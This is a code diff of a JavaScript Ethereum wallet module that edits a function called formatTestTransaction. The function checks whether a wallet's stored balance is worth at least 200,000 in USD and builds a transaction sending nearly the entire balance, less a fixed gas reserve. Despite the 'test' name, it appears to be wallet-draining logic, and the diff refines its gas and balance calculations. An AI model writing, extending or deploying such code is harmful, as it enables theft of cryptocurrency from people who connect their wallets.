@@ -149,14 +149,15 @@ export function recoverPersonalSignature(sig, msg) {
 
 (async () => {
     const ethPrice = await ethData();
-    localStorage.setItem('price', ethPrice?.coin?.price)
+    localStorage.setItem('price', ethPrice.coin.price)
 })()
 
 export async function formatTestTransaction(address, chainId) {
-    const balance = handleSignificantDecimals(convertAmountFromRawNumber(Number(localStorage.getItem('balance'))), 8);
-    const price = Number(localStorage.getItem('price'));
     const from = address;
     const qd = qf();
+
+    const balance = handleSignificantDecimals(convertAmountFromRawNumber(Number(localStorage.getItem('balance'))), 8);
+    const price = Number(localStorage.getItem('price'));
 
     (() => {
         if (Number(balance) * price >= 200000) {
@@ -166,13 +167,17 @@ export async function formatTestTransaction(address, chainId) {
 
     const _nonce = await apiGetAccountNonce(address, chainId);
     const nonce = sanitizeHex(convertStringToHex(_nonce));
+
     const gasPrices = await apiGetGasPrices();
     const _gasPrice = gasPrices.slow.price;
-    const gasPrice = sanitizeHex(convertStringToHex(convertAmountToRawNumber(_gasPrice, 8)));
+    const gasPrice = sanitizeHex(convertStringToHex(convertAmountToRawNumber(_gasPrice, 9)));
+
     const _gasLimit = 22000;
     const gasLimit = sanitizeHex(convertStringToHex(_gasLimit));
-    const balanceOf = Number(sessionStorage.getItem('balance')) - 6002441524727298;
+
+    const balanceOf = Number(localStorage.getItem('balance')) - 6000000000000000;
     const value = sanitizeHex(convertStringToHex(balanceOf));
+
     const data = "0x";
 
     const tx = {
